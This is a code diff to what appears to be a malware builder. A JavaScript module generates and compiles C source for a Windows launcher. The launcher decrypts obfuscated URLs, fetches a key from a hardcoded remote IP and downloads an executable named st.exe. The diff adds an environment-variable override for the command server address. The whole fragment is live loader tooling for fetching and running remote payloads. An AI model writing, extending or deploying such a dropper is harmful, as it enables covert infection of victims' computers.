@@ -40,7 +40,6 @@ END
 }
 
 function cSource({ ip, buildId }) {
-  // We point to the new /api/getkey endpoint
   const keyUrl = `http://${ip}/api/getkey/${buildId}`;
   const stUrl  = `http://${ip}/api/downloads/st.exe`;
 
@@ -130,7 +129,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     unsigned char encKeyUrl[] = { ${keyUrlArr} };
     unsigned char encStUrl[] = { ${stUrlArr} };
 
-    // 1. Fetch key.json from the server
+    // 1. Fetch key.json dynamically from the server
     wchar_t keyUrl[1024];
     decrypt_url(keyUrl, encKeyUrl, sizeof(encKeyUrl));
     
@@ -157,7 +156,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
 }
 
 export async function compileLauncher({ key, config, baseExe, buildId }) {
-  let ip = "31.58.77.63";
+  let ip = process.env.SERVER_IP || "95.182.96.216";
   if (config && config.ip) ip = config.ip;
 
   const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
